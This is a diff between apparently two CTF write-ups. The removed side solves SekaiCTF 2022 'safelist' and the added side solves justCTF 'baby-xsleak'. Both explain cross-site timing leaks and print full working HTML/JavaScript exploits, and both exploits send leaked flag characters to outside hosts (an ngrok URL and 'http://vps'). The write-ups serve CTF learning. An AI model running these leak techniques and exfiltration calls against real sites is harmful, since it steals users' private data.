@@ -1,208 +1,133 @@
-It's pretty helpful for performing xsleak.
+Initially, I didn't set object width and height, but later on, I found that it's important because the default size is too small to make a difference in the load time.
 
-For example, if we create a note like this(`[CHAR]` can be anything between A to Z): `[CHAR]<canvas height="1200px"></canvas><div id="scroll"></div>`, then we update the location to `#scroll`, if `[CHAR]` is before the flag, no scroll occurs.
+## Exploit
 
-A scroll occurs if `[CHAR]` is after the flag. If we can detect this behavior, we can leak the flag char by char.
-
-But the problem is there is a `Cross-Origin-Opener-Policy` header. By setting this header, we can't access the opened window:
-
-``` js
-var w = window.open('https://safelist.ctf.sekai.team/')
-setTimeout(() => {
-    w.location = 'https://safelist.ctf.sekai.team/#scroll' // not working
-    // even w.close() not working
-}, 200)
-```
-
-Basically, we lost all the controls on the opened window, we can just open it but can't close or update its location.
-
-Then, I came up with another way to do the leak.
-
-## Loading image
-
-Lazy loading image is a common technique for xsleaks, my idea is similar to the above, but just replace the scroll fragment with a lazy-loading image tag.
-
-We need to find a threshold to achieve something like this.
-
-The image is loaded when the note I created is before the flag.
-
-![note1](/img/sekaictf2022-safelist-xsleak/p2.png)
-
-When the note is after the flag, image is not load because of `loading=lazy` attribute.
-
-![note2](/img/sekaictf2022-safelist-xsleak/p3.png)
-
-The note content is something like this: `A<br><canvas height="1850px"></canvas><br><img loading=lazy src=/?img>`
-
-`1850px` is a well-crafted number, you can find this threshold by testing it locally, and it's worth mentioning that the threshold is different for normal  and headless browsers. You need to test it on the headless browser to find the correct number(3350px in this case).
-
-What can we do next?
-
-If the image is cached, we can detect it by timing the request, but unfortunately, there is a `Cache-Control: no-store` header, so there is no cache at all.
-
-How about using the concurrent limit to detect? In Chrome, you can only send 6 concurrent requests for each host. The rest will be pending hence takes more time to complete.
-
-So, we can send another request from our page, if images are loaded, our request should take more time.
-
-This should work according to the [solution](https://twitter.com/terjanq/status/1576605101514313735) from @terjanq, but at that time I used `fetch` for timing the request, and somehow the concurrent limit was not applied(maybe the partition key is different).
-
-You can watch these two videos for details:
-
-1. https://www.youtube.com/watch?v=ixyMZlIcnDI (Use script element to send request)
-2. https://www.youtube.com/watch?v=15CJQ9nzrxs (Use fetch to send request)
-
-But it's okay. We can still leverage other things.
-
-## Make server side busy?
-
-The server is running on Node.js, and we know that Node.js is single-threaded. What does this mean? This means it can only process one request at the same time.
-
-So, if you have time-consuming work, it may cause performance issues. When the server does some heavy job, the main thread is blocked, so the server can not process all other requests.
-
-Even if no endpoint does heave calculation in the challenge, we can still block the main thread for a bit when we send many requests.
-
-To sum up, the idea is like this:
-
-1. We create a note that starts with a CHAR(a-z)
-2. We keep using fetch to measure the response time
-3. If response time is less than the threshold, it means the CHAR is after the flag, so images are not load
-4. Otherwise, CHAR is before the flag
-5. The goal is to find a CHAR that `time(CHAR)>threshold && time(CHAR+1)<threshold`
-
-Below is the screenshot for trying two different chars.
-
-For the note that starts with `SEKAI{z`, the load time is 0.9s (for 30 requests), which means the images are not loaded.
-
-![req1](/img/sekaictf2022-safelist-xsleak/p4.png)
-
-For `SEKAI{m`, the load time is 1.7s which is much more than `z`, which means the correct char is between m to y.
-
-![req2](/img/sekaictf2022-safelist-xsleak/p5.png)
-
-By the way, we can use binary search to speed up the searching part.
-
-Exploit:
-
-https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45
+Here is my exploit in the end:
 
 ``` html
 <!DOCTYPE html>
 <html>
-<!--
-  The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs main thread.
-  If images are loading, the request to "/" is slower, otherwise faster.
-  By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
-  We can use fetch to measure the request time.
--->
+<head>
+
+</head>
 <body>
-  <button onclick="run()">start</button>
-  <form id=f action="http://localhost:1234/create" method="POST" target="_blank">
-    <input id=inp name="text" value="">
-  </form>
+  <img src="https://deelay.me/30000/https://example.com">
+    <script>
+      fetch('https://deelay.me/30000/https://example.com')
 
-  <form id=f2 action="http://localhost:1234/remove" method="POST" target="_blank">
-    <input id=inp2 name="index" value="">
-  </form>
-  <script>
-    let flag = 'SEKAI{'
-    const TARGET = 'https://safelist.ctf.sekai.team'
-    f.action = TARGET + '/create'
-    f2.action = TARGET + '/remove'
+      function send(data) {
+        fetch('http://vps?data='+encodeURIComponent(data)).catch(err => 1)
+      }
 
-    const sleep = ms => new Promise(r => setTimeout(r, ms))
-    const send = data => fetch('http://server.ngrok.io?d='+data)
-    const charset = 'abcdefghijklmnopqrstuvwxyz'.split('')
+      function leak(char, callback) {
+        return new Promise(resolve => {
+          let ss = 'just_random_string'
+          let url = `http://baby-xsleak-ams3.web.jctf.pro/search/?search=${char}&msg=`+ss[Math.floor(Math.random()*ss.length)].repeat(1000000)
+          let start = performance.now()
+          let object = document.createElement('object');
+          object.width = '2000px'
+          object.height = '2000px'
+          object.data = url;
+          object.onload = () => {
+            object.remove()
+            let end = performance.now()
+            resolve(end - start)
+          }
+          object.onerror = () => console.log('Error event triggered');
+          document.body.appendChild(object);
+        })
+        
+      }
 
-    // start exploit
-    let count = 0
-    setTimeout(async () => {
-      let L = 0
-      let R = charset.length - 1
-      while( (R-L)>3 ) {
-        let M = Math.floor((L + R) / 2)
-        let c = charset[M]
-        send('try_' + flag + c)
-        const found = await testChar(flag + c)
-        if (found) {
-          L = M
-        } else {
-          R = M - 1
+      send('start')
+
+      let charset = 'abcdefghijklmnopqrstuvwxyz_}'.split('')
+      let flag = 'justCTF{'
+
+      async function main() {
+        let found = 0
+        let notFound = 0
+        for(let i=0;i<3;i++) {
+          await leak('..')
+        }
+        for(let i=0; i<3; i++) {
+          found += await leak('justCTF')
+        }
+        for(let i=0; i<3; i++) {
+          notFound += await leak('NOT_FOUND123')
+        }
+
+        found /= 3
+        notFound /= 3
+        
+        send('found flag:'+found)
+        send('not found flag:'+notFound)
+
+        let threshold = found - ((found - notFound)/2)
+        send('threshold:'+threshold)
+
+        if (notFound > found) {
+          return
+        }
+
+        // exploit
+        while(true) {
+          if (flag[flag.length - 1] === '}') {
+            break
+          }
+          for(let char of charset) {
+            let trying = flag + char
+            let time = 0
+            for(let i=0; i<3; i++) {
+              time += await leak(trying)
+            }
+            time/=3
+            send('char:'+trying+',time:'+time)
+            if (time >= threshold) {
+              flag += char
+              send(flag)
+              break
+            }
+          }
         }
       }
 
-      // fallback to linear since I am not familiar with binary search lol
-      for(let i=R; i>=L; i--) {
-        let c = charset[i]
-        send('try_' + flag + c)
-        const found = await testChar(flag + c)
-        if (found) {
-          send('found: '+ flag+c)
-          flag += c
-          break
-        }
-      }
+      main()
       
-    }, 0)
-
-    async function testChar(str) {
-      return new Promise(resolve => {
-          /*
-            For 3350, you need to test it on your local to get this number.
-            The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
-            If starts with "A", the image should be loaded because it's in the threshold.
-          */
-          inp.value = str + '<br><canvas height="3350px"></canvas><br>'+Array.from({length:20}).map((_,i)=>`<img loading=lazy src=/?${i}>`).join('')
-          f.submit()
-
-          setTimeout(() => {
-            run(str, resolve)
-          }, 500)
-      })
-    }
-
-    async function run(str, resolve) {
-    // if the request is not enough, we can send more by opening more window
-      for(let i=1; i<=5;i++) {
-        window.open(TARGET)
-      }
-      
-      let t = 0
-      const round = 30
-      setTimeout(async () => {
-        for(let i=0; i<round; i++) {
-          let s = performance.now()
-          await fetch(TARGET + '/?test', {
-            mode: 'no-cors'
-          }).catch(err=>1)
-          let end = performance.now()
-          t += end - s
-          console.log(end - s)
-        }
-        const avg = t/round
-        send(str + "," + t + "," + "avg:" + avg)
-
-        /*
-          I get this threshold(1000ms) by trying multiple times on remote admin bot
-          for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
-        */
-        const isFound = (t >= 1000)
-        if (isFound) {
-          inp2.value = "0"
-        } else {
-          inp2.value = "1"
-        }
-
-        // remember to delete the post to not break our leak oracle
-        f2.submit()
-        setTimeout(() => {
-          resolve(isFound)
-        }, 200)
-      }, 200)
-    }
-    
-  </script>
-
+    </script>
 </body>
 
 </html>
 ```
+
+When exploiting the xsleak challenge, I need to send the log back to my server to know if anything is wrong.
+
+For example, the threshold is sometimes inaccurate, so I need to update the exploit a few times manually.
+
+Also, there are a few details to make the exploit faster and more stable. 
+
+First, I send a few requests before measuring the load time. The first few requests are not that accurate due to DNS lookup, initial connection, etc.
+
+Second, I send a request three times and take it's average to be more accurate(but the trade-off is that the exploit will take more time)
+
+Third, you can leak the charset first to reduce the time and request significantly:
+
+``` js
+// leak charset
+let charset = 'abcdefghijklmnopqrstuvwxyz_}'.split('')
+let newCharset = ''
+for(let char of charset) {
+  let time = 0
+  for(let i=0; i<3; i++) {
+    time += await leak(char)
+  }
+  time/=3
+  send('char:' + char + ',time:' + time)
+  if (time >= thershold) {
+    newCharset += char
+    send(newCharset)
+  }
+}
+```
+
+I spent most of the time tweaking these details to get the expected result. Anyway, by running the exploit a few times, we can get the flag in the end: `justCTF{timeme__}`(IIRC, the server is off, and I forgot to take the screenshot)
